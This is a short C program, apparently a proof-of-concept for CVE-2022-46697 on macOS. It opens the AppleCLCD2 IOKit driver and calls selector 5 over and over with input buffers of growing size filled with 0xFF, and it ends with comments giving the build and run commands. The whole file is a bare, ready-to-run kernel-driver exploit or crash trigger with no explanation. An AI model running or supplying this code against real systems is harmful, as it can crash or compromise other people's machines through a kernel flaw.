#include <stdio.h>
#include <IOKit/IOKitLib.h>
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
int main(int argc, const char **argv)
{
    kern_return_t IOMasterPort(mach_port_t, mach_port_t *);
    mach_port_t mach_port = MACH_PORT_NULL;
    IOMasterPort(MACH_PORT_NULL, &mach_port);
    io_connect_t client = MACH_PORT_NULL;
    io_service_t service = IOServiceGetMatchingService(mach_port, IOServiceMatching("AppleCLCD2"));
    size_t type = 0;
    size_t selector = 5;
    if (service == MACH_PORT_NULL)
    {
        return 0;
    }
    if (IOServiceOpen(service, mach_task_self(), type, &client) == KERN_SUCCESS)
    {
        for (size_t inputStructCnt = 0; inputStructCnt < 4096; inputStructCnt++)
        {
            void *inputStruct = calloc(inputStructCnt, sizeof(uint16_t));
            for (size_t offset = 0; offset < inputStructCnt; offset++)
            {
                ((uint16_t*)inputStruct)[offset] = 0xFF;
            }
            IOServiceOpen(service, mach_task_self(), type, &client);
            printf("type: %zu | selector: %zu | inputStructCnt: %zu\n", type, selector, inputStructCnt);
            IOConnectCallMethod(client, selector, 0, 0, inputStruct, inputStructCnt, 0, 0, 0, 0);
            IOServiceClose(client);
            free(inputStruct);
        }
    }
    return 0;
}
// clang -o CVE-2022-46697 CVE-2022-46697.c -framework IOKit
// ./CVE-2022-46697